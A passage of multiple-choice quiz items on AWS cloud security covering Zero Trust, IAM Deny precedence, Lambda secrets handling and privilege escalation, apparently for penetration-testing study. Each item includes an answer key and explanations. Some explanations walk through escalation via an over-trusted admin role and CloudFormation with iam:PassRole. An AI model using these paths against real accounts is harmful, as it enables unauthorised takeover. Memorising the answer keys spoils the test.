MFA for AWS console access and network ACLs blocking unauthorized CIDR ranges

explanations.a: Zero Trust is built on 'never trust, always verify' — no implicit trust based on network location. Option A operationalizes all three Zero Trust pillars for cloud access: (1) Identity-based micro-segmentation ensures access is granted based on verified identity and resource attributes, not network position. (2) MFA with short-lived STS credentials means each session is explicitly authenticated and credentials expire automatically, reducing exposure from compromised tokens. (3) Just-in-time least-privilege access ensures developers receive only the permissions they need, when they need them, with automatic revocation — eliminating standing privileges that attackers can abuse.
explanations.b: IP allowlist perimeter firewalls are the antithesis of Zero Trust — they grant implicit trust to any connection from an approved IP range, regardless of user identity, device health, or context. Developers working from home, coffee shops, or compromised corporate networks all receive the same access if their IP is on the allowlist.
explanations.c: Disk encryption and VPN provide data-at-rest protection and encrypted transit, but they do not implement identity-based access verification, continuous authentication, or least-privilege enforcement. A VPN grants implicit trusted network access once connected — exactly what Zero Trust aims to eliminate.
explanations.d: MFA for console access and network ACLs are useful security controls but represent a perimeter-centric approach. MFA without short-lived credentials still allows persistent access, and network ACLs operate at the IP layer without identity context — neither satisfies Zero Trust's continuous verification and least-privilege requirements.

questions.name: Cloud Computing
questions.keyword: cloud IAM privilege escalation lateral movement
questions.text: In AWS IAM policy evaluation, what happens when an explicit Deny statement and an Allow statement both apply to the same API action for the same principal?

answers.text: Allow takes precedence if it is in an identity-based policy attached directly to the IAM user
Allow takes precedence if it was created more recently than the Deny statement
Deny always takes precedence over Allow regardless of which policy type contains each statement
The conflict is flagged as an IAM policy error and the request is rejected pending manual review

explanations.a: Policy type (identity-based vs resource-based) does not determine precedence when Allow and Deny conflict. AWS IAM evaluation logic explicitly states that an explicit Deny in any policy overrides an Allow in any other policy, regardless of policy type or attachment method.
explanations.b: Policy creation timestamp has no effect on IAM evaluation. AWS does not resolve Allow/Deny conflicts based on which policy was created first or most recently — the explicit Deny always wins.
explanations.c: AWS IAM policy evaluation follows a strict priority order: (1) default Deny all, (2) evaluate all applicable policies, (3) if any explicit Deny is found → Deny (final), (4) if an Allow is found with no explicit Deny → Allow. An explicit Deny statement overrides any Allow regardless of whether the Deny is in an SCP, permissions boundary, resource-based policy, or identity-based policy. This is a foundational AWS security principle.
explanations.d: AWS IAM does not queue policy conflicts for manual review. Evaluation is real-time and deterministic — explicit Deny immediately results in an AccessDenied error returned to the caller.

questions.name: Cloud Computing
questions.keyword: cloud IAM privilege escalation lateral movement
questions.text: A penetration tester with limited IAM permissions discovers a role named 'OrgAdminRole' with AdministratorAccess and a trust policy that allows all IAM principals in the same AWS account to assume it. The tester's user has sts:AssumeRole permission. Which attack does this misconfiguration enable?

answers.text: Cross-account data exfiltration by assuming the role from an external AWS account
Privilege escalation via SAML assertion forgery targeting the role's identity provider
Lateral movement to EC2 instances in a different AWS region using the role credentials
Vertical privilege escalation by assuming OrgAdminRole to gain full administrative access to the account

explanations.a: Cross-account role assumption requires the trust policy to explicitly include a principal from an external account (e.g., arn:aws:iam::EXTERNAL-ACCOUNT-ID:root). The scenario specifies the trust policy allows principals within the SAME account — cross-account assumption is not enabled by this configuration.
explanations.b: SAML assertion forgery targets federated identity setups where a SAML identity provider is used for authentication. This attack requires compromising the IdP or its signing keys — it is unrelated to a misconfigured IAM role trust policy in a standard AWS account.
explanations.c: IAM roles and credentials are global within an AWS account — they are not region-specific. Assuming a role grants API access to all regions (subject to resource policies and SCPs), so 'lateral movement to a different region' is not a distinct attack enabled by this misconfiguration.
explanations.d: The tester has sts:AssumeRole permission, and the OrgAdminRole trust policy explicitly allows all IAM principals in the account to assume it. This is a textbook vertical privilege escalation: by calling sts:AssumeRole('OrgAdminRole'), the tester receives temporary AdministratorAccess credentials, escalating from limited permissions to full account control. This is one of the most critical IAM misconfigurations in AWS environments.

questions.name: Cloud Computing
questions.keyword: cloud IAM privilege escalation lateral movement
questions.text: A penetration tester discovers that a Lambda function's environment variables contain plaintext database credentials (DB_PASSWORD=SuperSecret123). Which remediation represents the MOST secure secrets management practice?

answers.text: Store the credentials in AWS Secrets Manager and grant the Lambda execution role the secretsmanager:GetSecretValue permission for only that secret
Base64-encode the credentials before storing them in Lambda environment variables to prevent plaintext exposure
Move the credentials to an S3 object with server-side encryption (SSE-S3) and download them at function startup
Embed the credentials in the Lambda deployment package as compiled constants within the function binary

explanations.a: AWS Secrets Manager is the purpose-built solution for storing, rotating, and controlling access to sensitive credentials. The recommended pattern is: (1) store the secret in Secrets Manager with automatic rotation configured, (2) grant the Lambda execution role a least-privilege policy allowing secretsmanager:GetSecretValue only for that specific secret ARN, (3) retrieve the secret at runtime via the Secrets Manager API. This ensures credentials are never stored in plaintext, are automatically rotated, and access is fully audited via CloudTrail.
explanations.b: Base64 encoding is trivially reversible and provides zero security — it is encoding, not encryption. Any attacker who views the Lambda configuration (via console, CLI, or API call with appropriate permissions) can instantly decode a Base64-encoded credential to plaintext. This is a security theater solution that creates a false sense of security.
explanations.c: Storing credentials in S3 with SSE-S3 provides encryption at rest, but S3 is not a secrets management solution. Credentials in S3 lack automatic rotation, fine-grained access auditing per secret, and version management. Additionally, downloading from S3 at function startup introduces latency and requires S3 permissions that could be misused by other functions.
explanations.d: Embedding credentials as compiled constants in a deployment package is the worst practice — credentials are baked into the artifact, visible to anyone with access to the deployment package, stored in version control systems and CI/CD pipelines, and cannot be rotated without redeploying the function.

questions.name: Cloud Computing
questions.keyword: cloud IAM privilege escalation lateral movement
questions.text: During a cloud penetration test, a tester's IAM user has cloudformation:CreateStack and iam:PassRole permissions. The tester locates an IAM role named 'CFNAdminRole' with AdministratorAccess whose trust policy allows cloudformation.amazonaws.com to assume it. How does this combination enable privilege escalation?

answers.text: CloudFormation stacks always execute with the AWS root account's permissions regardless of the specified role

The tester can deploy a CloudFormation stack specifying CFNAdminRole as the execution role; CloudFormation assumes that role to create resources, enabling the tester to provision IAM users or policies with administrative permissions
CloudFormation templates automatically bypass all Service Control Policies (SCPs) applied at the AWS Organizations level
Creating a CloudFormation stack grants the creator permanent CloudFormation administrator permissions in the account

explanations.a: CloudFormation does not execute with root account permissions. It assumes an explicitly specified IAM role (passed via iam:PassRole) or uses the calling user's permissions if no role is specified. The permissions used are those of the specified role — not root.
explanations.b: This is a documented AWS privilege escalation path (CloudFormation privilege escalation via iam:PassRole, identified by Rhino Security Labs). The attack chain: (1) tester has cloudformation:CreateStack and iam:PassRole, (2) tester creates a CloudFormation stack template that provisions a new IAM user with AdministratorAccess or adds AdministratorAccess to the tester's own user, (3) tester specifies CFNAdminRole as the stack execution role using iam:PassRole, (4) CloudFormation assumes CFNAdminRole and executes the template with full administrative permissions, (5) the IAM modifications take effect, escalating the tester's privileges beyond their original permissions.
explanations.c: CloudFormation does not bypass Service Control Policies (SCPs). SCPs are enforced at the organization level and apply to all principals including CloudFormation service roles. Even with AdministratorAccess, actions prohibited by an SCP cannot be performed.
explanations.d: Creating a CloudFormation stack grants no additional permissions to the creator beyond what they already have. The creator receives no new IAM permissions from the act of stack creation — only the role assumed by CloudFormation during deployment gains elevated permissions for that deployment.
